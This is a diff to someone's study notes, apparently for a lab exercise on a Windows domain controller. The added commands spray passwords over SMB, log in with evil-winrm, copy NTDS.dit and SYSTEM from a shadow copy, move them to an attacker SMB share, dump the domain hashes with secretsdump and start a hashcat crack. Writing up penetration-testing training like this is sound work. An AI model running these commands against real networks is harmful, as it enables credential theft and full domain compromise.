@@ -1420,7 +1420,7 @@ We can then copy the `NTDS.dit` file from the volume shadow copy of `C:` ont
 
 ```shell
 # In C:\NTDS>
-cmd.exe /c copy \\?
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
 
 #### Transferring NTDS.dit to attack host
@@ -1496,4 +1496,65 @@ kerbrute userenum --dc 10.129.236.78 usernames.txt --domain ILF.local
 2026/10/04 12:09:43 >  [+] VALID USERNAME:	 jstapleton@ILF.local
 2026/10/04 12:09:44 >  [+] VALID USERNAME:	 cjohnson@ILF.local
 2026/10/04 12:09:45 >  [+] VALID USERNAME:	 jmarston@ILF.local
+```
+
+```shell
+netexec smb 10.129.236.78 -u cjohnson -p /usr/share/wordlists/fasttrack.txt 
+---
+SMB         10.129.236.78   445    ILF-DC01         [+] ILF.local\cjohnson:Welcome1212 
+```
+
+>[!Important] 
+>I found the passwd's user that the exercise didn't ask me for (cjohnson). 
+
+Correct User: 
+
+```shell
+netexec smb 10.129.236.78 -u jmarston -p /usr/share/wordlists/fasttrack.txt
+---
+SMB         10.129.236.78   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
+```
+
+Now, we can login
+
+```shell
+evil-winrm -i 10.129.236.78 -u jmarston -p P@ssword! 
+```
+### Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)
+
+```shell
+vssadmin SHADOW LIST
+mkdir NTDS
+cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\NTDS\ntds.dit"
+cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\NTDS\SYSTEM.save"
+# AND SAVE IN OUR TAGET MACHINE VIA SMB
+sudo impacket-smbserver share  -smb2support . # ATTACKER
+cmd.exe /c "move C:\NTDS\NTDS.dit \\10.10.15.48\share" # VICTIM
+cmd.exe /c "move C:\NTDS\SYSTEM.save \\10.10.15.48\share" # VICTIM
+```
+
+```shell
+impacket-secretsdump -ntds ntds.dit -system SYSTEM.save LOCAL
+---
+[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8af61f67a96ac6fb352f192b1cfc6b56:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
+ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
+ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
+ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
+ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
+LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
+]
+```
+
+We extract the NTLM of jennifer: `92fd67fd2f49d0e83744aa82363f021b`
+
+```shell
+hashcat -m 1000 '92fd67fd2f49d0e83744aa82363f021b' /usr/share/wordlists/rockyou.txt
 ```
